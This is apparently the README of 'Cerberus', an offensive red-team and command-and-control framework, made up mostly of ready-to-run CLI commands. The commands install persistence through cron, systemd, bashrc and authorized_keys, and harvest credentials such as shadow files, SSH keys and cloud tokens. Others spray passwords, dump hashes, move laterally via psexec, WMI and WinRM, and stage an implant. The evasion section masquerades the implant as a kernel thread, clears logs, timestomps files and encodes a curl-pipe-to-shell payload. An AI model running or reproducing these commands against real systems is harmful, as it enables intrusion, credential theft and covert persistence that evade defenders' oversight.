# Cerberus

**Elite Red Team Framework** — Clean. Fast. Autonomous. Stealth-by-default.

## Status (v0.2)

- [x] Core + CLI + AES-GCM C2 + multi-session post-ex
- [x] MCP + Ollama
- [x] Recon / enum plugins
- [x] **Persistence helpers**
- [x] **Credential dump helpers**
- [x] **Lateral movement wrappers**

**45 plugins** total.

---

## Persistence

Implant-backed (need active beacon):

```bash
# Cron @reboot
PYTHONPATH=. python -m cerberus.cli.main run persist_cron \
  --payload "/tmp/.svc &" --beacon <id>

# User systemd service
PYTHONPATH=. python -m cerberus.cli.main run persist_systemd \
  --payload "/tmp/.svc" --beacon <id>

# bashrc
PYTHONPATH=. python -m cerberus.cli.main run persist_bashrc --payload "nohup /tmp/.svc &"

# SSH authorized_keys
PYTHONPATH=. python -m cerberus.cli.main run persist_sshkey \
  --pubkey "ssh-ed25519 AAAA... operator@box"

# Audit
PYTHONPATH=. python -m cerberus.cli.main run persist_check
PYTHONPATH=. python -m cerberus.cli.main run c2_results
```

| Plugin | Method |
|--------|--------|
| `persist_cron` | crontab (`schedule=` default `@reboot`) |
| `persist_systemd` | user systemd unit (+ cron fallback) |
| `persist_bashrc` | `~/.bashrc` append |
| `persist_sshkey` | `authorized_keys` |
| `persist_check` | Audit common locations |

---

## Credential dump

```bash
# From beacon — pack histories, ssh keys, aws/docker, shadow if root
PYTHONPATH=. python -m cerberus.cli.main run cred_harvest_linux
PYTHONPATH=. python -m cerberus.cli.main run c2_results
# loot: sessions/loot/<beacon_id>/.cerberus_creds.tgz

PYTHONPATH=. python -m cerberus.cli.main run cred_from_history

# Operator-side (needs impacket / netexec)
PYTHONPATH=. python -m cerberus.cli.main run secretsdump \
  --target 10.10.11.10 --user admin --password 'P@ss' --domain CORP

PYTHONPATH=. python -m cerberus.cli.main run secretsdump \
  --target 10.10.11.10 --user admin --hash aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889

PYTHONPATH=. python -m cerberus.cli.main run cred_spray \
  --target 10.10.11.0/24 --user administrator --password 'Winter2026!' 

PYTHONPATH=. python -m cerberus.cli.main run cred_show
```

Creds are written to evidence (`kind=credential`) and `sessions/credentials.txt`.

---

## Lateral movement

```bash
# SSH (operator)
PYTHONPATH=. python -m cerberus.cli.main run lateral_ssh \
  --target 10.10.11.5 --user root --password 'x' --cmd "id; hostname"

# SSH pivot from beacon
PYTHONPATH=. python -m cerberus.cli.main run lateral_ssh_beacon \
  --target 10.10.11.6 --user root --cmd "id"

# Windows
PYTHONPATH=. python -m cerberus.cli.main run lateral_psexec \
  --target 10.10.11.20 --user admin --password 'x' --cmd "whoami"
PYTHONPATH=. python -m cerberus.cli.main run lateral_wmi \
  --target 10.10.11.20 --user admin --hash <nthash> --domain CORP
PYTHONPATH=. python -m cerberus.cli.main run lateral_winrm \
  --target 10.10.11.20 --user admin --password 'x'

# File staging
PYTHONPATH=. python -m cerberus.cli.main run lateral_scp \
  --target 10.10.11.5 --user root --local ./cerberus-implant --remote /tmp/.svc
```

| Plugin | Requires |
|--------|----------|
| `lateral_ssh` | ssh / sshpass |
| `lateral_ssh_beacon` | active beacon + ssh on target hop |
| `lateral_psexec` | netexec or impacket-psexec |
| `lateral_wmi` | impacket-wmiexec |
| `lateral_winrm` | evil-winrm |
| `lateral_scp` | scp / sshpass |

---

## Multi-session C2 (reminder)

```bash
PYTHONPATH=. python -m cerberus.cli.main set c2_key "strong-secret"
PYTHONPATH=. python -m cerberus.cli.main run c2_start
CERBERUS_C2=IP:8443 CERBERUS_KEY="strong-secret" ./cerberus-implant

run c2_beacons
run c2_interact --beacon <id> --label jump01
run c2_shell --cmd "id"
run c2_broadcast --cmd "hostname"
```

## License

GPL-3.0

---

## Evasion / OPSEC (v0.3)

```bash
# Stealth profile drives scan speed, threads, delays
run evasion_profile --cmd ninja
run evasion_opsec_report

# Beacon timing
run evasion_jitter --seconds 60
run evasion_delay --seconds 5

# Implant process name + self-delete from disk
run evasion_masq --cmd "[kworker/0:1]"
run evasion_self_delete

# Host checks / cleanup
run evasion_sandbox_check
run evasion_timestomp --path /tmp/.svc --ref /etc/passwd
run evasion_clear_logs

# Payload encoding
run evasion_encode --payload "curl http://x/s|sh"
```

**Implant env**

| Variable | Effect |
|----------|--------|
| `CERBERUS_DELAY` | Seconds to wait before first connect |
| `CERBERUS_MASQ` | `prctl` process name (15 chars) |
| `CERBERUS_SANDBOX_EXIT=1` | Exit early if low-uptime / docker heuristic hits |
| `CERBERUS_SLEEP` | Base beacon interval (jitter up to ~40%) |

Stealth profiles: `noisy` | `balanced` | `ninja` (slower scans, fewer threads, policy blocks dangerous ops).

